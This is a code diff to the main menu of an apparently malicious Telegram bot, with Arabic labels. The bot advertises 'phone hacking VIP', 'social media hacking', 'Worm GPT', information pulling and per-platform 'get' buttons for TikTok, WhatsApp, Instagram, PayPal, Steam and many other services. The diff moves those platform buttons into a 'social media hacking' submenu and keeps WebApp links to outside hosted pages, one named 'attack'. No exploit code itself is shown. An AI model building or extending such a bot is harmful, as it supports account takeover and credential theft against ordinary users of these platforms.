@@ -405,7 +405,7 @@ def build_menu(buttons_data, url_overrides=None, color_cycle=None):
     return markup
 
 def build_main_menu():
-    """القائمة الرئيسية — كل الخيارات في قائمة واحدة"""
+    """القائمة الرئيسية"""
     url_overrides = {
         "webapp_info": WebAppInfo("https://homeless-yellow-nzcr4lytkv.edgeone.app/"),
         "webapp_block": WebAppInfo("https://hamza7k555-rgb.github.io/hogom3/"),
@@ -434,32 +434,12 @@ def build_main_menu():
         ("سحب معلومات 📱", "fi_reply"),
         ("Worm GPT 🐛", "worm_gpt"),
         ("OSINT 🔍", "osint_menu"),
-        ("📱 اختراق الهاتف VIP 📱", "phone_hack_vip"),
-        ("تيك توك 🎵", "get_tiktok"),
-        ("واتساب 💬", "get_whatsapp"),
-        ("انستجرام 📸", "get_instagram"),
-        ("فيسبوك 👍", "get_facebook"),
-        ("سناب شات 👻", "get_snapchat"),
-        ("يوتيوب ▶️", "get_youtube"),
-        ("تويتر 🐦", "get_twitter"),
-        ("ببجي 🎯", "get_pubg"),
-        ("فري فاير 🔫", "get_freefire"),
-        ("قوقل 🔍", "get_google"),
-        ("باي بال 💳", "get_messenger"),
-        ("كواي 🎬", "get_kwai"),
-        ("نتفليكس 🎬", "get_netflix"),
-        ("ديسكورد 💻", "get_discord"),
-        ("روبلكس 🎮", "get_roblox"),
-        ("لينكدإن 💼", "get_linkedin"),
-        ("سبوتيفاي 🎧", "get_spotify"),
-        ("تويتش 📺", "get_twitch"),
-        ("ستيم 🎮", "get_steam"),
-        ("مايكروسوفت 🪟", "get_microsoft"),
-        ("ياهو 📧", "get_yahoo"),
     ]
     markup = InlineKeyboardMarkup(row_width=2)
-    pairs_before = pairs[:24]
-    pairs_after = pairs[24:]
+    markup.row(InlineKeyboardButton("🔥 اختراق السوشيال ميديا", callback_data="social_media_menu", style="danger"))
+    markup.row(InlineKeyboardButton("📱 قسم اختراق الهاتف كامل VIP", callback_data="phone_hack_vip", style="danger"))
+    pairs_before = pairs[:12]
+    pairs_after = pairs[12:]
     inner_before = build_menu(pairs_before, url_overrides)
     inner_after = build_menu(pairs_after, url_overrides)
     for row in inner_before.keyboard:
